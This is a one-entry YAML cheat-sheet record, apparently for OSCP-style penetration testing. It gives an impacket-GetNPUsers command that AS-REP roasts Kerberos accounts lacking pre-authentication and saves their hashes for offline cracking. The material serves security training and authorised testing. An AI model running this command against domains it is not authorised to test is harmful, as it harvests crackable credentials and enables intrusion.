---
command: |
  impacket-GetNPUsers -dc-ip $IP $DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile hashes.asrep
description: AS-REP roast accounts with pre-auth disabled (no creds needed).
os: [Linux]
category: [oscp, cli]
service: [Kerberos]
phase: [Exploitation]
references:
  - https://github.com/fortra/impacket
---
